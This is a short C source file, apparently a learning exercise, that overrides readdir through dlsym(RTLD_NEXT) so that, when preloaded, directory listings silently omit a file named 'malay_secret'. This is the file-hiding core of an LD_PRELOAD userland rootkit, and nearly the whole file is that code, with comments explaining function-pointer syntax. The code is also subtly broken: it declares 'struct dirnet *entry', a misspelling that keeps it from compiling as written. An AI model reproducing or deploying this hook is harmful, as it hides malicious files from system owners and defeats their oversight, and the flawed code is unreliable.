#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h> 

const char *hidden_file = "malay_secret" ; 

// In this context, the asterisk before the function name readdir indicates that the function returns a pointer to a struct dirent.
struct dirent* readdir(DIR *dirp) {

    /*
    
    Declares a pointer to a function called original_readdir 

    (*original_readdir): The parentheses around *original_readdir are crucial.
    They indicate that original_readdir is a pointer to a function, not a function itself. In C, when declaring a pointer to a function,
    the asterisk must be enclosed in parentheses to avoid confusion with the declaration of a function that returns a pointer.
(DIR *): This part indicates the parameter type of the function that original_readdir points to. In this case, it points to a function that takes a single argument of type DIR*, which is a pointer to a DIR structure representing a directory stream.
    */
    struct dirent*(*original_readdir_function)(DIR *) = dlsym(RTLD_NEXT, "readdir");

    struct dirnet *entry ;
    
    while((entry = original_readdir_function(dirp)) != NULL ){
        if (strcmp(entry->d_name, hidden_file) == 0 ){

            continue; 

        }

        return entry;
    }

    return NULL;


}